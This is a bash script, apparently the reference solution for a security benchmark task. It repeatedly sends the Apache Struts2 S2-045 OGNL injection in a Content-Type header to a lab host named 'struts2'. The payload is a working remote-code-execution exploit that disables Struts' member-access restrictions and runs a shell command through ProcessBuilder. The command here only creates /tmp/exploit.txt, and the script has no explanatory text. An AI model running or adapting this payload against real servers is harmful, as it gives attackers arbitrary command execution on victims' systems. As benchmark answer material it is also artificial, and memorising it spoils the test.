#!/usr/bin/env bash
set -euo pipefail

# Wait for Tomcat/Struts2 to initialize
sleep 10

exploit_once() {
  local base='http://struts2:8080'
  
  # OGNL injection via malformed Content-Type header (simplified payload)
  curl -sS --max-time 60 -X POST "${base}/" \
    -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='touch /tmp/exploit.txt').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.start())}" \
    --data-raw '' \
    >/dev/null 2>&1 || return 1
}

for _ in $(seq 1 30); do
  if exploit_once; then 
    sleep 2
    exit 0
  fi
  sleep 3
done

echo 'oracle_solution: struts2 s2-045 exploit failed' >&2
exit 1
